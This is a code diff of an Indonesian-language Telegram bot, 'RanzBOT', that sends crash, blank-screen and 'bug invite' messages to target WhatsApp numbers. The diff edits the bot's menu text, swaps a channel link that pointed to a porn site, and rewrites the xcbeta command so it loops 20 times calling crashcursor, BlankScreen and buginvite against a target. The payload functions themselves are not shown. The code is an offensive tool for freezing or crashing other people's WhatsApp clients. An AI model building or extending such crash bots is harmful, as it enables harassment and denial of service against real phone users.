@@ -371,7 +371,7 @@ const buttons = Markup.inlineKeyboard([
     Markup.button.callback('ℹ️ About', 'about'),
   ],
   // Baris terakhir: Tombol URL mengarah ke channel
-  [Markup.button.url('📢 Ranz Ganteng', 'https://xnxx.com/')],
+  [Markup.button.url('📢 Join Channel', 'https://t.me/')],
 ]);
   await ctx.replyWithPhoto(getRandomPhoto(), {
     caption: `
@@ -457,7 +457,7 @@ Aloo ${ctx.from.first_name || 'User'} Aku Adalah Bot RanzBOT.2 Yang Siap, Memban
 │
 ㅒ
 │ /xcbeta ( Crash? idk )
-│ /delaymaker
+│ /delaymaker 1 hour ( Andro only )
 ㅒ
 │
 ╰━━━ㅡ━━━━━ㅡ━━━━━━⬣
@@ -1469,10 +1469,10 @@ bot.command("xcbeta", cooldownMiddleware, checkWhatsAppConnection, async ctx => 
 
   // Melakukan proses freezing 50 kali
   for (let i = 0; i < 20; i++) {
+        await crashcursor(target, { ptcp: true });
         await BlankScreen(target, { ptcp: true });
-        await BlankScreen(target, { ptcp: true });
-        await BlankScreen(target, { ptcp: true });
-        await BlankScreen(target, { ptcp: true });
+        await buginvite(target, { ptcp: true });
+        await crashcursor(target, { ptcp: true });
   }
 
   // Menyelesaikan proses response
